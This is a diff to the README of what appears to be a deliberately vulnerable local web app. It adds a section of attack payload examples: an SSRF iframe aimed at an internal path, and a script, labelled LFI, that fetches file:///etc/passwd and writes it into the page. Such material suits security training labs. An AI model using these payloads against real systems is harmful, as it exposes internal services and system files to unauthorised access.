@@ -12,3 +12,22 @@ $ docker compose up
 ## URL
 http://localhost:5000
 
+
+## 攻撃ペイロード例
+
+- SSRF
+```html
+<iframe src="http://localhost:5000/internal"></iframe>
+```
+
+- LFI
+```html
+<script>
+xhr = new XMLHttpRequest();
+xhr.open("GET", "file:///etc/passwd");
+xhr.onload = function(){
+    document.write(this.responseText)
+};
+xhr.send();
+</script>
+```
